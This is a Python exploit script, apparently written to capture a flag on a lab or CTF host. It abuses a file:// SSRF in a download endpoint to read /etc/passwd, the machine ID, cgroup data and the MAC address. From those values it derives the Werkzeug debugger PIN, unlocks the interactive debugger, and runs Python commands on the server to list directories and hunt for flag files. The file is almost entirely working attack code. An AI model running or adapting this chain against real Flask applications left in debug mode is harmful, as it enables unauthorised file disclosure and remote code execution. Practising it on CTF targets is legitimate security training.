"""
Exploit Werkzeug debugger PIN to get RCE and find the flag.txt.
The app runs with debug=True, so the Werkzeug interactive debugger is available.
We calculate the PIN using info from the file:// SSRF.
"""
import requests
import hashlib
import itertools

T = "http://10.82.168.213"


def read_file_ssrf(path):
    """Read a file from the server via file:// SSRF."""
    r = requests.get(f"{T}/download?server=file://{path}?&id=1", timeout=8)
    if r.status_code == 200 and len(r.content) > 0:
        t = r.content.decode(errors="replace")
        if "Werkzeug" not in t:
            return r.content
    return None


def get_werkzeug_pin():
    """Calculate the Werkzeug debugger PIN."""
    
    # 1. Get username
    print("[1] Reading /etc/passwd...")
    passwd = read_file_ssrf("/etc/passwd")
    if passwd:
        print(f"    OK: {passwd.decode()[:200]}")
        # Find the user running the app - from /proc/self/environ we know HOME=/root
        username = "root"
    else:
        username = "root"
    print(f"    Username: {username}")

    # 2. Module path: flask.app -> Flask
    modname = "flask.app"
    appname = "Flask"
    # Get the actual Flask module path
    mod_path = "/usr/local/lib/python3.10/site-packages/flask/app.py"
    print(f"    modname={modname}, appname={appname}")
    print(f"    mod_path={mod_path}")

    # 3. Machine ID
    print("\n[2] Getting machine ID...")
    machine_id = b""

    # Try /etc/machine-id first
    data = read_file_ssrf("/etc/machine-id")
    if data:
        machine_id = data.strip()
        print(f"    /etc/machine-id: {machine_id}")
    else:
        # Try /proc/sys/kernel/random/boot_id
        data = read_file_ssrf("/proc/sys/kernel/random/boot_id")
        if data:
            machine_id = data.strip()
            print(f"    boot_id: {machine_id}")

    # For Docker containers, also check /proc/self/cgroup
    cgroup_data = read_file_ssrf("/proc/self/cgroup")
    cgroup_value = b""
    if cgroup_data:
        print(f"    /proc/self/cgroup: {cgroup_data.decode()[:200]}")
        for line in cgroup_data.decode().splitlines():
            # Extract container ID from cgroup
            parts = line.strip().split("/")
            if len(parts) > 1:
                val = parts[-1]
                if len(val) >= 12 and val != "":
                    cgroup_value = val.encode()
                    break
        if cgroup_value:
            print(f"    cgroup value: {cgroup_value}")

    # 4. MAC address
    print("\n[3] Getting MAC address...")
    mac_hex = None
    for iface in ["eth0", "ens0", "ens33", "enp0s3"]:
        data = read_file_ssrf(f"/sys/class/net/{iface}/address")
        if data:
            mac_str = data.decode().strip()
            print(f"    {iface} MAC: {mac_str}")
            # Convert to integer
            mac_hex = int(mac_str.replace(":", ""), 16)
            print(f"    MAC as int: {mac_hex}")
            break

    if not mac_hex:
        print("    Could not get MAC address!")
        return None

    # 5. Calculate PIN (Werkzeug >= 2.0 uses SHA1, older uses MD5)
    print("\n[4] Calculating PIN...")

    # Build the hash inputs
    probably_public_bits = [
        username,           # username
        modname,            # modname
        appname,            # getattr(app, '__name__', type(app).__name__)
        mod_path,           # getattr(mod, '__file__', None)
    ]

    # For machine_id, combine machine-id + cgroup
    node_id = str(mac_hex)

    # Combine machine_id and cgroup value
    if machine_id and cgroup_value:
        combined_id = machine_id + cgroup_value
    elif machine_id:
        combined_id = machine_id
    elif cgroup_value:
        combined_id = cgroup_value
    else:
        combined_id = b""

    private_bits = [
        node_id,
        combined_id,
    ]

    print(f"    public_bits: {probably_public_bits}")
    print(f"    private_bits: [{node_id}, {combined_id}]")

    # Try both old (MD5) and new (SHA1) methods
    for hash_method in ["sha1", "md5"]:
        h = hashlib.new(hash_method)
        for bit in itertools.chain(probably_public_bits, private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode("utf-8")
            h.update(bit)

        if hash_method == "sha1":
            # Werkzeug >= 2.0
            h.update(b"cookiesalt")
            cookie_name = "__wzd" + h.hexdigest()[:20]
            
            num = None
            h2 = hashlib.new(hash_method)
            h2.update(h.digest())
            h2.update(b"pinsalt")
            num = f"{int(h2.hexdigest(), 16):09d}"[:9]
        else:
            # Old Werkzeug
            num = f"{int(h.hexdigest(), 16):09d}"[:9]

        # Format as XXX-XXX-XXX
        pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
        print(f"    PIN ({hash_method}): {pin}")

    return pin


def test_pin(pin):
    """Test if a PIN works with the Werkzeug debugger."""
    # First trigger an error to get the debugger
    err_url = f"{T}/download?server=file:///nonexistent?&id=1"
    r = requests.get(err_url, timeout=8)
    
    # Extract the secret from the error page
    import re
    secret_match = re.search(r's=([a-zA-Z0-9]+)', r.text)
    if secret_match:
        secret = secret_match.group(1)
        print(f"\n[5] Werkzeug debugger secret: {secret}")
        
        # Try to authenticate with PIN
        auth_url = f"{T}?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}"
        r = requests.get(auth_url, timeout=8)
        print(f"    Auth response: {r.text[:200]}")
        
        if "true" in r.text.lower():
            print("    PIN ACCEPTED!")
            
            # Execute commands
            cmds = [
                "import os; os.listdir('/usr/src/app')",
                "import os; os.listdir('/usr/src/app/public-docs')",
                "import os; os.listdir('/usr/src/app/static')",
                "import os; [f for r,d,files in os.walk('/usr/src/app') for f in files if f.endswith('.txt')]",
            ]
            
            for cmd in cmds:
                exec_url = f"{T}?__debugger__=yes&cmd={requests.utils.quote(cmd)}&frm=0&s={secret}"
                r = requests.get(exec_url, timeout=8)
                # Extract result from response
                result = re.findall(r'<span class="string">&#39;([^&]+)&#39;</span>', r.text)
                if not result:
                    result = re.findall(r'>([^<]+)<', r.text)
                print(f"\n    >>> {cmd}")
                print(f"    {r.text[:500]}")
        else:
            print("    PIN rejected.")
    else:
        print("    Could not find debugger secret in error page.")


if __name__ == "__main__":
    pin = get_werkzeug_pin()
    if pin:
        test_pin(pin)
